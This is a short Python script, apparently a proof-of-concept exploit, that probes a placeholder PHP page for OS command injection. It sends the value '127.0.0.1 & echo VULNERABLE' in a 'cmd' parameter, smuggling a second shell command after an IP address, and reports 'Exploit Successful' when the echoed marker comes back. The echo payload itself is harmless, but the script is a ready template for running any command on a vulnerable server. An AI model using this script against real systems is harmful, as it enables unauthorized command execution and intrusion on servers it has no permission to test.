import requests

target_url = "http://your-website.com/vulnerable.php"


payload = "127.0.0.1 & echo VULNERABLE"

params = {
    'cmd': payload
}

response = requests.get(target_url, params=params)

response_text = response.text

if "VULNERABLE" in response_text:
    print("Exploit Successful")
else:
    print("Exploit may not have worked")

print(response_text)
